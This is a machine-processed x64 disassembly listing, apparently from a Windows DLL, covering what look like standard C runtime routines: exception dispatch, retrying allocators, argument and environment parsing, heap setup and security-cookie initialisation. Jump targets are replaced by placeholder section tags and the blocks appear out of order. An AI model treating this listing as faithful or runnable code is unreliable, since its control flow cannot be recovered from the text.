pop rdi
retn
mov rcx [ rsp + 0x60 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_18000a210
sub rsp 0x10
mov [ rsp ] r10
mov [ rsp + 0x8 ] r11
xor r11 r11
lea r10 [ rsp + 0x18 ]
sub r10 rax
cmovb r10 r11
mov r11 [ gs : 0x10 ]
cmp r10 r11
jae r-xdata
mov r10 [ rsp ]
mov r11 [ rsp + 0x8 ]
add rsp 0x10
retn
and r10w 0xf000
lea r11 [ r11 - 0x1000 ]
mov [ r11 ] 0x0
cmp r10 r11
jne r-xdata
sub_18000a260
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
mov [ r11 + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r15 [ r9 + 0x8 ]
mov r14 [ r9 ]
mov eax [ rcx + 0x4 ]
mov rdi [ r9 + 0x38 ]
sub r14 r15
mov r12 r9
mov r13 rdx
mov rbp rcx
test al 0x66
jne r-xdata
mov r8 [ r9 + 0x20 ]
xor ebp ebp
xor r13d r13d
sub r8 r15
test al 0x20
je r-xdata
movsxd rsi [ r9 + 0x48 ]
mov [ r11 - 0x38 ] rcx
mov [ r11 - 0x30 ] r8
mov rax rsi
cmp esi [ rdi ]
jae r-xdata
movsxd rsi [ r9 + 0x48 ]
mov rbx rsi
cmp esi [ rdi ]
jae r-xdata
xor edx edx
cmp [ rdi ] edx
jbe r-xdata
mov eax 0x1
add rax rax
lea rbx [ rdi + rax * 8 + 0xc ]
inc rbx
shl rbx 0x4
add rbx rdi
lea rcx [ rdi + 0x8 ]
inc esi
add rbx 0x10
cmp esi [ rdi ]
jae r-xdata
mov eax [ rbx - 0x4 ]
cmp r14 rax
jae r-xdata
inc esi
add rbx 0x10
cmp esi [ rdi ]
jb r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jae r-xdata
inc edx
add rcx 0x10
cmp edx [ rdi ]
jae r-xdata
mov eax [ rcx ]
cmp r8 rax
jbe r-xdata
jmp r-xdata
cmp [ rbx + 0x4 ] 0x0
je r-xdata
mov eax [ rbx - 0xc ]
cmp r14 rax
jb r-xdata
test r13d r13d
je r-xdata
jmp r-xdata
mov eax edx
add rax rax
mov ecx [ rdi + rax * 8 + 0x10 ]
test ecx ecx
jne r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jb r-xdata
cmp [ rbx ] 0x1
je r-xdata
test ebp ebp
je r-xdata
cmp r13d [ rbx ]
je r-xdata
mov eax [ rcx - 0x4 ]
cmp r8 rax
jb r-xdata
mov r13d ecx
mov ebp [ rdi + rax * 8 + 0xc ]
jmp r-xdata
cmp [ rbp ] 0xe06d7363
jne r-xdata
mov eax [ rbx ]
lea rcx [ rsp + 0x30 ]
mov rdx r13
add rax r15
call rax
test eax eax
js r-xdata
cmp [ rbx ] 0x0
jne r-xdata
cmp ebp [ rbx - 0x4 ]
je r-xdata
mov ecx [ rbx + 0x4 ]
mov r8d 0x1
mov rdx r13
add rcx r15
call sub_18000ba70
mov rax [ r12 + 0x40 ]
mov edx [ rbx + 0x4 ]
movsxd r9 [ rbp ]
mov [ rsp + 0x28 ] rax
mov rax [ r12 + 0x28 ]
add rdx r15
mov r8 rbp
mov rcx r13
mov [ rsp + 0x20 ] rax
call [ RtlUnwindEx@IAT ]
call sub_18000baa0
cmp [ r--data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
jle r-xdata
mov rdx [ rsp + 0x78 ]
lea eax [ rsi + 0x1 ]
mov cl 0x1
mov [ r12 + 0x48 ] eax
mov r8d [ rbx - 0x4 ]
add r8 r15
call r8
lea rcx [ r--data ]
call sub_18000da60
test eax eax
je r-xdata
lea r11 [ rsp + 0x40 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov edx 0x1
mov rcx rbp
call [ r--data ]
sub_18000a460
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov edi [ rw-data ]
xor ebp ebp
mov rsi rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test edi edi
je r-xdata
mov ecx ebp
call [ Sleep@IAT ]
mov edi [ rw-data ]
lea r11d [ rbp + 0x3e8 ]
cmp r11d edi
mov ebp r11d
cmova ebp r12d
cmp ebp r12d
jne r-xdata
mov rcx rsi
call sub_180006de4
mov rbx rax
test rax rax
jne r-xdata
sub_18000a4e0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor edi edi
mov rsi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
cmp [ rw-data ] eax
jbe r-xdata
mov ecx edi
call [ Sleep@IAT ]
lea r11d [ rdi + 0x3e8 ]
cmp r11d [ rw-data ]
mov edi r11d
cmova edi r12d
cmp edi r12d
jne r-xdata
xor r8d r8d
mov rdx rsi
mov rcx rbp
call sub_18000daa4
mov rbx rax
test rax rax
jne r-xdata
sub_18000a564
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
xor esi esi
mov rdi rdx
mov rbp rcx
or r12d 0xffffffff
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop r12
retn
test rdi rdi
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
mov ecx esi
call [ Sleep@IAT ]
lea r11d [ rsi + 0x3e8 ]
cmp r11d [ rw-data ]
mov esi r11d
cmova esi r12d
cmp esi r12d
jne r-xdata
mov rdx rdi
mov rcx rbp
call sub_1800070c8
mov rbx rax
test rax rax
jne r-xdata
sub_18000a5ec
push rbx
sub rsp 0x20
mov ebx ecx
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
test rax rax
je r-xdata
add rsp 0x20
pop rbx
retn
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov ecx ebx
call rax
sub_18000a658
push rbx
sub rsp 0x20
call EncodePointer
mov rcx rax
mov rbx rax
call sub_180007dd0
mov rcx rbx
call sub_180008c10
mov rcx rbx
call sub_18000de18
mov rcx rbx
call sub_18000de10
mov rcx rbx
call sub_18000dbac
mov rcx rbx
add rsp 0x20
pop rbx
jmp sub_18000db8c
sub_18000a69c
cmp rcx rdx
jae r-xdata
retn
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rax
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
sub_18000a6d0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor eax eax
mov rdi rdx
mov rbx rcx
cmp rcx rdx
jae r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test eax eax
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
add rbx 0x8
cmp rbx rdi
jb r-xdata
call rcx
sub_18000a70c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ r--data ] 0x0
mov ebx ecx
je r-xdata
call sub_18000ceb4
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_18000a6d0
test eax eax
jne r-xdata
lea rcx [ r--data ]
call sub_18000da60
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea rcx [ sub_18000b1fc ]
call sub_180007db8
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
mov ecx ebx
call [ r--data ]
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
add rbx 0x8
call rax
xor eax eax
lea rcx [ rw-data ]
call sub_18000da60
test eax eax
je r-xdata
xor r8d r8d
xor ecx ecx
lea edx [ r8 + 0x2 ]
call [ rw-data ]
sub_18000a7bc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] r8d
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r12d r8d
mov ebx edx
mov r15d ecx
mov ecx 0x8
call sub_18000c3c4
nop
cmp [ rw-data ] 0x1
je r-xdata
test r12d r12d
je r-xdata
mov [ rw-data ] 0x1
mov [ rw-data ] r12b
test ebx ebx
jne r-xdata
mov [ rw-data ] 0x1
mov ecx 0x8
call sub_18000c2c4
mov ecx r15d
call sub_18000a5ec
mov ecx r15d
call [ ExitProcess@IAT ]
mov ecx 0x8
call sub_18000c2c4
test r12d r12d
jne r-xdata
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_18000a69c
nop
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rsi rax
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_18000a69c
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rdi rax
mov [ rsp + 0x20 ] rax
mov r14 rsi
mov [ rsp + 0x28 ] rsi
mov r13 rax
mov [ rsp + 0x38 ] rax
call EncodePointer
cmp [ rdi ] rax
jne r-xdata
cmp rdi rsi
jb r-xdata
jmp r-xdata
mov rcx [ rdi ]
call [ DecodePointer@IAT ]
mov rbx rax
call EncodePointer
mov [ rdi ] rax
call rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
mov rbx rax
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
cmp r14 rbx
jne r-xdata
sub rdi 0x8
mov [ rsp + 0x20 ] rdi
cmp rdi rsi
jb r-xdata
mov r14 rbx
mov [ rsp + 0x28 ] rbx
mov rsi rbx
mov [ rsp + 0x30 ] rbx
mov r13 rax
mov [ rsp + 0x38 ] rax
mov rdi rax
mov [ rsp + 0x20 ] rax
jmp r-xdata
cmp r13 rax
je r-xdata
sub_18000a990
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x90
lea rcx [ rsp + 0x20 ]
call [ GetStartupInfoW@IAT ]
mov edx 0x58
lea ebp [ rdx - 0x38 ]
mov ecx ebp
call sub_18000a4e0
xor r14d r14d
mov rdx rax
test rax rax
jne r-xdata
mov [ rw-data ] rax
add rax 0xb00
mov ecx ebp
mov [ rw-data ] ecx
cmp rdx rax
jae r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x62 ] r14w
je r-xdata
add rdx 0x9
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
mov r12d r14d
mov rbx r14
mov rax [ rsp + 0x68 ]
test rax rax
je r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x2f ] 0xa00
mov [ rdx + 0x31 ] 0xa
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rw-data ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov ecx [ rw-data ]
lea eax [ r12 - 0x1 ]
mov [ rbx + rdi + 0x8 ] 0x81
neg eax
mov eax 0xfffffff6
sbb ecx ecx
add ecx 0xfffffff5
test r12d r12d
cmove ecx eax
call [ GetStdHandle@IAT ]
mov rbp rax
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbx + rdi ] 0xfffffffffffffffe
je r-xdata
movsxd r12 [ rax ]
mov ebx 0x800
lea r13 [ rax + 0x4 ]
add r12 r13
cmp [ rax ] ebx
cmovl ebx [ rax ]
cmp ecx ebx
jge r-xdata
or [ rbx + rdi + 0x8 ] 0x40
mov [ rbx + rdi ] 0xfffffffffffffffe
test rax rax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x80
jmp r-xdata
mov edi r14d
test ebx ebx
jle r-xdata
lea rdi [ rw-data ]
mov rdi [ rw-data ]
cmp [ rbx + rdi ] 0xffffffffffffffff
je r-xdata
mov ecx [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
mov rcx rax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
add rbx 0x58
inc r12d
cmp rbx 0x108
jl r-xdata
cmp [ r12 ] 0xffffffffffffffff
je r-xdata
mov ebx [ rw-data ]
mov edx [ rw-data ]
lea rcx [ rax + 0xb00 ]
mov [ rdi ] rax
add edx ebp
mov [ rw-data ] edx
cmp rax rcx
jae r-xdata
movzx eax al
mov [ rbx + rdi ] rbp
cmp eax 0x2
jne r-xdata
inc edi
inc r13
add r12 0x8
cmp edi ebx
jl r-xdata
cmp [ r12 ] 0xfffffffffffffffe
je r-xdata
add rdi 0x8
cmp edx ebx
jl r-xdata
lea rdx [ rax + 0x9 ]
cmp eax 0x3
jne r-xdata
or [ rbx + rdi + 0x8 ] 0x40
jmp r-xdata
test [ r13 ] 0x1
je r-xdata
mov edx 0x58
mov rcx rbp
call sub_18000a4e0
test rax rax
je r-xdata
jmp r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
and [ rdx + 0x2f ] 0x80
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x30 ] 0xa0a
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rdi ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov edx [ rw-data ]
lea rcx [ rbx + rdi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x8
test [ r13 ] 0x8
jne r-xdata
inc [ rbx + rdi + 0xc ]
jmp r-xdata
movsxd rbp edi
lea rcx [ rw-data ]
mov edx 0xfa0
mov rax rbp
and ebp 0x1f
sar rax 0x5
imul rbp rbp 0x58
add rbp [ rcx + rax * 8 ]
mov rax [ r12 ]
mov [ rbp ] rax
mov al [ r13 ]
lea rcx [ rbp + 0x10 ]
mov [ rbp + 0x8 ] al
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
mov rcx [ r12 ]
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ rbp + 0xc ]
sub_18000ac64
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
lea rbx [ rw-data ]
mov esi 0x40
add rbx 0x8
dec rsi
jne r-xdata
lea rax [ rdi + 0xb00 ]
jmp r-xdata
mov rdi [ rbx ]
test rdi rdi
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp rdi rax
jb r-xdata
cmp [ rdi + 0xc ] 0x0
je r-xdata
mov rcx [ rbx ]
call sub_180006da4
and [ rbx ] 0x0
mov rax [ rbx ]
add rdi 0x58
add rax 0xb00
lea rcx [ rdi + 0x10 ]
call [ DeleteCriticalSection@IAT ]
sub_18000acd8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
mov rbx [ rw-data ]
xor edi edi
test rbx rbx
jne r-xdata
call sub_1800099e8
mov al [ rbx ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
lea eax [ rdi + 0x1 ]
mov edx 0x8
movsxd rcx eax
call sub_18000a4e0
mov rdi rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rcx rbx
call sub_18000be60
lea rbx [ rbx + rax + 0x1 ]
inc edi
mov rbx [ rw-data ]
cmp [ rbx ] 0x0
je r-xdata
mov rcx rbx
call sub_180006da4
and [ rw-data ] 0x0
and [ rdi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
mov rcx rbx
call sub_18000be60
cmp [ rbx ] 0x3d
lea esi [ rax + 0x1 ]
je r-xdata
movsxd rax esi
add rbx rax
cmp [ rbx ] 0x0
jne r-xdata
movsxd rbp esi
mov edx 0x1
mov rcx rbp
call sub_18000a4e0
mov [ rdi ] rax
test rax rax
je r-xdata
mov rbx [ rw-data ]
mov rcx [ rw-data ]
call sub_180006da4
and [ rw-data ] 0x0
jmp r-xdata
mov r8 rbx
mov rdx rbp
mov rcx rax
call sub_180009e10
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d64
int3
add rdi 0x8
sub_18000ae08
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r13 [ rsp + 0x60 ]
mov r14 r9
mov rdi r8
and [ r13 ] 0x0
mov r12 rdx
mov rbx rcx
mov [ r9 ] 0x1
test rdx rdx
je r-xdata
xor ebp ebp
mov [ rdx ] r8
add r12 0x8
inc [ r13 ]
test rdi rdi
je r-xdata
xor eax eax
test ebp ebp
mov sil 0x22
sete al
inc rbx
mov ebp eax
jmp r-xdata
movzx esi [ rbx ]
inc rbx
mov ecx esi
call sub_18000de9c
test eax eax
je r-xdata
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test ebp ebp
jne r-xdata
test sil sil
je r-xdata
inc [ r13 ]
test rdi rdi
je r-xdata
cmp [ rbx ] 0x22
jne r-xdata
cmp sil 0x20
je r-xdata
dec rbx
inc rbx
mov al [ rbx ]
mov [ rdi ] al
inc rdi
test rdi rdi
je r-xdata
cmp sil 0x9
jne r-xdata
test r12 r12
je r-xdata
cmp [ rbx ] 0x20
je r-xdata
xor esi esi
mov [ rdi - 0x1 ] 0x0
jmp r-xdata
inc [ r14 ]
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
and [ r12 ] 0x0
inc rbx
jmp r-xdata
cmp [ rbx ] 0x9
jne r-xdata
cmp [ rbx ] 0x0
je r-xdata
test r12 r12
je r-xdata
inc [ r14 ]
mov [ r12 ] rdi
add r12 0x8
cmp [ rbx ] 0x5c
je r-xdata
inc rbx
inc ecx
cmp [ rbx ] 0x22
jne r-xdata
test ecx ecx
jne r-xdata
test dl cl
jne r-xdata
dec ecx
test rdi rdi
je r-xdata
mov al [ rbx ]
test al al
je r-xdata
shr ecx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ r13 ]
mov [ rdi ] 0x5c
inc rdi
test rdi rdi
je r-xdata
test esi esi
jne r-xdata
xor eax eax
xor edx edx
test esi esi
sete al
mov esi eax
lea rax [ rbx + 0x1 ]
cmp [ rax ] 0x22
jne r-xdata
inc [ r13 ]
jmp r-xdata
mov [ rdi ] 0x0
inc rdi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov rbx rax
jmp r-xdata
cmp [ rbx ] 0x0
je r-xdata
inc rbx
jmp r-xdata
movsx ecx al
call sub_18000de9c
test rdi rdi
je r-xdata
cmp al 0x9
je r-xdata
mov edx 0x1
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
inc [ r13 ]
inc rbx
inc [ r13 ]
mov al [ rbx ]
mov [ rdi ] al
inc rdi
jmp r-xdata
mov al [ rbx ]
inc rbx
mov [ rdi ] al
inc rdi
inc [ r13 ]
sub_18000afd8
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
cmp [ rw-data ] 0x0
jne r-xdata
lea rdi [ rw-data ]
mov r8d 0x104
xor ecx ecx
mov rdx rdi
mov [ rw-data ] 0x0
call [ GetModuleFileNameA@IAT ]
mov rbx [ rw-data ]
mov [ rw-data ] rdi
test rbx rbx
je r-xdata
call sub_1800099e8
mov rbx rdi
cmp [ rbx ] 0x0
jne r-xdata
or eax 0xffffffff
movsxd rcx [ rsp + 0x48 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
xor r8d r8d
xor edx edx
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000ae08
movsxd rsi [ rsp + 0x40 ]
mov rcx 0x1fffffffffffffff
cmp rsi rcx
jae r-xdata
lea rdx [ rcx + rsi * 8 ]
cmp rdx rcx
jb r-xdata
mov rcx rdx
call sub_18000a460
mov rdi rax
test rax rax
je r-xdata
lea r8 [ rax + rsi * 8 ]
lea rax [ rsp + 0x48 ]
lea r9 [ rsp + 0x40 ]
mov rdx rdi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_18000ae08
mov r11d [ rsp + 0x40 ]
mov [ rw-data ] rdi
dec r11d
xor eax eax
mov [ rw-data ] r11d
jmp r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
sub_18000b0d0
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x40
call [ GetEnvironmentStringsW@IAT ]
xor r12d r12d
mov rdi rax
test rax rax
je r-xdata
xor eax eax
mov rbx rax
cmp [ rax ] r12w
je r-xdata
mov [ rsp + 0x38 ] r12
sub rbx rax
mov [ rsp + 0x30 ] r12
sar rbx 0x1
mov r8 rax
xor edx edx
lea r9d [ rbx + 0x1 ]
xor ecx ecx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] r12
call [ WideCharToMultiByte@IAT ]
movsxd rbp eax
test eax eax
je r-xdata
add rbx 0x2
cmp [ rbx ] r12w
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rcx rbp
call sub_18000a460
mov rsi rax
test rax rax
je r-xdata
add rbx 0x2
cmp [ rbx ] r12w
jne r-xdata
mov [ rsp + 0x38 ] r12
mov [ rsp + 0x30 ] r12
lea r9d [ rbx + 0x1 ]
mov r8 rdi
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] ebp
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov rcx rdi
call [ FreeEnvironmentStringsW@IAT ]
mov rax rsi
jmp r-xdata
mov rcx rsi
call sub_180006da4
mov rsi r12
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
sub_18000b1c4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_18000b1fc
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rbx [ r--data ]
lea rdi [ r--data ]
jmp r-xdata
cmp rbx rdi
jb r-xdata
mov rax [ rbx ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
add rbx 0x8
call rax
sub_18000b234
sub rsp 0x28
xor r8d r8d
mov edx 0x1000
xor ecx ecx
mov [ rsp + 0x30 ] 0x2
call [ HeapCreate@IAT ]
mov [ rw-data ] rax
test rax rax
je r-xdata
add rsp 0x28
retn
call [ GetVersion@IAT ]
cmp al 0x6
jae r-xdata
mov eax 0x1
mov rcx [ rw-data ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x4
xor edx edx
call [ HeapSetInformation@IAT ]
sub_18000b2ac
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rsi rdx
mov edi ecx
call sub_1800079c8
xor r9d r9d
mov rbx rax
test rax rax
je r-xdata
xor eax eax
mov rdx [ rax + 0xa0 ]
mov rcx rdx
lea rax [ rdx + 0xc0 ]
cmp rcx rax
jae r-xdata
lea rax [ rdx + 0xc0 ]
add rcx 0x10
cmp rcx rax
jb r-xdata
mov rcx r9
cmp [ rcx ] edi
je r-xdata
cmp [ rcx ] edi
je r-xdata
mov r8 [ rcx + 0x8 ]
test r8 r8
je r-xdata
test rcx rcx
je r-xdata
cmp r8 0x5
jne r-xdata
cmp r8 0x1
jne r-xdata
mov [ rcx + 0x8 ] r9
lea eax [ r8 - 0x4 ]
jmp r-xdata
mov rbp [ rbx + 0xa8 ]
mov [ rbx + 0xa8 ] rsi
cmp [ rcx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov [ rcx + 0x8 ] r9
mov ecx [ rcx + 0x4 ]
call r8
mov edx 0x30
mov rax [ rbx + 0xa0 ]
add rdx 0x10
mov [ rdx + rax - 0x8 ] r9
cmp rdx 0xc0
jl r-xdata
cmp [ rcx ] 0xc000008e
mov edi [ rbx + 0xb0 ]
jne r-xdata
cmp [ rcx ] 0xc0000090
jne r-xdata
mov [ rbx + 0xb0 ] 0x83
jmp r-xdata
cmp [ rcx ] 0xc0000091
jne r-xdata
mov [ rbx + 0xb0 ] 0x81
jmp r-xdata
mov edx [ rbx + 0xb0 ]
mov ecx 0x8
call r8
mov [ rbx + 0xb0 ] edi
jmp r-xdata
cmp [ rcx ] 0xc0000093
jne r-xdata
mov [ rbx + 0xb0 ] 0x84
jmp r-xdata
mov [ rbx + 0xa8 ] rbp
jmp r-xdata
cmp [ rcx ] 0xc000008d
jne r-xdata
mov [ rbx + 0xb0 ] 0x85
jmp r-xdata
cmp [ rcx ] 0xc000008f
jne r-xdata
mov [ rbx + 0xb0 ] 0x82
jmp r-xdata
cmp [ rcx ] 0xc0000092
jne r-xdata
mov [ rbx + 0xb0 ] 0x86
jmp r-xdata
cmp [ rcx ] 0xc00002b5
jne r-xdata
mov [ rbx + 0xb0 ] 0x8a
jmp r-xdata
cmp [ rcx ] 0xc00002b4
mov eax edi
mov edx 0x8e
cmove eax edx
mov [ rbx + 0xb0 ] eax
mov [ rbx + 0xb0 ] 0x8d
jmp r-xdata
sub_18000b490
mov [ rsp + 0x18 ] rbx
push rdi
sub rsp 0x20
mov rax [ rw-data ]
and [ rsp + 0x30 ] 0x0
mov rdi 0x2b992ddfa232
cmp rax rdi
je r-xdata
lea rcx [ rsp + 0x30 ]
call [ GetSystemTimeAsFileTime@IAT ]
mov rbx [ rsp + 0x30 ]
call [ GetCurrentProcessId@IAT ]
mov r11d eax
xor rbx r11
call [ GetCurrentThreadId@IAT ]
mov r11d eax
xor rbx r11
call [ GetTickCount@IAT ]
lea rcx [ rsp + 0x38 ]
mov r11d eax
xor rbx r11
call [ QueryPerformanceCounter@IAT ]
mov r11 [ rsp + 0x38 ]
xor r11 rbx
mov rax 0xffffffffffff
and r11 rax
mov rax 0x2b992ddfa233
cmp r11 rdi
cmove r11 rax
mov [ rw-data ] r11
not r11
mov [ rw-data ] r11
not rax
mov [ rw-data ] rax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18000b544
lea r8 [ r--data ]
xor eax eax
mov rdx r8
cdqe
add rax rax
mov rax [ r8 + rax * 8 + 0x8 ]
retn
inc eax
add rdx 0x10
cmp eax 0x16
jb r-xdata
cmp ecx [ rdx ]
je r-xdata
xor eax eax
retn
sub_18000b570
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x250
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x240 ] rax
mov edi ecx
call sub_18000b544
xor esi esi
mov rbx rax
test rax rax
je r-xdata
mov rcx [ rsp + 0x240 ]
xor rcx rsp
call sub_180006220
lea r11 [ rsp + 0x250 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
lea ecx [ rsi + 0x3 ]
call sub_18000e298
cmp eax 0x1
je r-xdata
mov ecx 0xfffffff4
call [ GetStdHandle@IAT ]
mov rdi rax
